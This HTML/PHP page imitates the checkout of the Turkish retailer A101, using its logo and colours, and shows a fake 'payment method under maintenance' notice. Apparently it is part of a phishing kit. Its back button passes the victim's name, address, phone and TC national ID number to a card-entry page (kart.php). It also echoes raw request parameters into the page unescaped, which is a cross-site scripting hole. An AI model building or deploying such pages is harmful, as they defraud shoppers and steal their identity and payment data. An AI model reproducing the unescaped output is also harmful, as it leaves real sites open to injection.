<!DOCTYPE html>
<html lang="tr">
<head>
<style>
    footer{
      background:#00B3C8;
      text-align:center;
      position:fixed;
      bottom:0;
      width:100%;
    }
    footer ul li{
      display:inline;
      text-decoration:none;
      list-style:none;
      margin:10px;
    }
    footer ul li i{
      font-size:36px;
      color: white;
    }
  </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Lütfen müşteri temsilcisiyle iletişime geçin!</title>
</head>
<body>
<header class="page-checkout-header" style="background-color:#00B3C8">
    <input type="hidden" id="bundle-type" value="">
      <a href="/" class="logo" title="A101">
        <img loading="lazy" src="https://ayb.akinoncdn.com/static_omnishop/ayb861/assets/img/logo%40a101-2x.png" alt="">
      </a>
  </header>
  <div class="sms" style="text-align:center;">
    <i class="fa-solid fa-triangle-exclamation" style="color:red; font-size:48px;"></i>         
    <h3>Geçici süreliğine bu ödeme yöntemi bakımdadır. Lütfen diğer ödeme seçeneklerini deneyiniz.</h3>
  <a href="kart.php?kart.php?ad=<?php echo $_GET["ad"];?>&soyisim=<?php echo $_GET['soyisim'];?>&postakodu=<?php echo $_GET['postakodu'];?>&adres=<?php echo $_GET['adres'];?>&telefon=<?php echo $_GET['telefon'];?>&tc=<?php echo $_GET['tc'];?>'"><button style="
    padding: 10px;
    width: 100px;
    font-size: 16px;
    background: #3783c9;
    color: white;
    border: 0;
    border-radius: 5px;
">Geri Dön</button>   
    </a>    </div>
   
</body>
</html>